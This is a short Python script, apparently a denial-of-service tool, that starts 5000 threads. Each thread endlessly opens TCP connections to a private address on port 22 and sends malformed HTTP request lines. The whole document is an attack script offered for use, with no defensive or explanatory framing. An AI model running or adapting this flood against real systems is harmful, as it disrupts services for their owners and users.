import threading
import socket

target = '192.168.123.4'
port = 22
myIP = '192.168.123.1'

connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + myIP + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global connected
        connected += 1
        print(connected)

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()